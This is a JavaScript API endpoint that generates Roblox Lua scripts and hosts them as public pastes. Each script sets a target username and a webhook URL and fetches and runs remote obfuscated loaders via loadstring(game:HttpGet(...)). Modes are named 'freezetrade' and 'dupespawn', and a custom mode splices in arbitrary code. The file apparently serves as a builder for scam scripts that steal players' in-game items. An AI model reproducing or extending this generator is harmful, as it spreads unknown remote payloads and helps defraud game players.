// api/generate.js
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { username, webhook, mode, brainrots, skins, gears, customCode, userId } = req.body;

    if (!username) {
        return res.status(400).json({ error: 'Username is required' });
    }

    try {
        const script = buildScript(username, webhook, mode, brainrots || [], skins || [], gears || []);

        // Guardar en pastefy interno
        const pasteId = await saveToInternalPaste(
            script,
            `Script para ${username}`,
            userId
        );

        // URL limpia con /raw/
        const baseUrl = process.env.BASE_URL || 'https://oblivionhub.xyz';
        const rawUrl = `${baseUrl}/raw/${pasteId}`;

        return res.status(200).json({
            loadstring: `loadstring(game:HttpGet("${rawUrl}"))()`,
            script: script,
            pasteUrl: rawUrl,
            pasteId: pasteId,
            obfuscated: false
        });

    } catch (error) {
        console.error('Error general:', error);
        return res.status(500).json({ error: error.message });
    }
}

// ============================================================
//  CONSTRUIR SCRIPT
// ============================================================
function buildScript(username, webhook, mode, brainrots, skins, gears) {
    function luaTable(arr, indent = '    ') {
        if (arr.length === 0) return '{}';
        const items = arr.map(item => `["${item.replace(/"/g, '\\"')}"] = true`);
        return '{\n' + items.map(s => indent + s).join(',\n') + '\n}';
    }

    let script = `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;
    script += `getgenv().WEBHOOK_URL = "${webhook ? webhook.replace(/"/g, '\\"') : 'WEBHOOK_URL'}"\n`;
    script += `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;
    script += `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;
    script += `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;

    const guiLoadstrings = {
        adminpanel: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/94990d249776151a9ef2e92cf5cd9797.lua"))()',
        freezetrade: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7603f80b0fd8c5fddf99fe263fa8c771.lua"))()',
        dupespawn: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/25526aa4c6be770707acf9100c1e88ed.lua"))()'
    };

    let fullScript = script;

    if (mode === 'normal') {
        fullScript += `
task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)`;
    } else if (mode in guiLoadstrings) {
        fullScript += `
task.spawn(function()
    ${guiLoadstrings[mode]}
end)`;
    } else if (mode === 'custom') {
        fullScript += `
task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)`;
        if (customCode && customCode.trim()) {
            fullScript += `\n\ntask.spawn(function()\n    ${customCode.replace(/\n/g, '\n    ')}\nend)`;
        }
    }

    return fullScript;
}

// ============================================================
//  GUARDAR EN PASTEFY INTERNO (devuelve solo el ID)
// ============================================================
async function saveToInternalPaste(content, title, userId) {
    const baseUrl = process.env.BASE_URL || 'https://oblivionhub.xyz';

    const response = await fetch(`${baseUrl}/api/paste`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: content,
            title: title || 'Untitled',
            userId: userId || null,
            public: true
        })
    });

    if (!response.ok) {
        const error = await response.json();
        throw new Error(error.error || 'Error al guardar el paste');
    }

    const data = await response.json();
    return data.id;
}
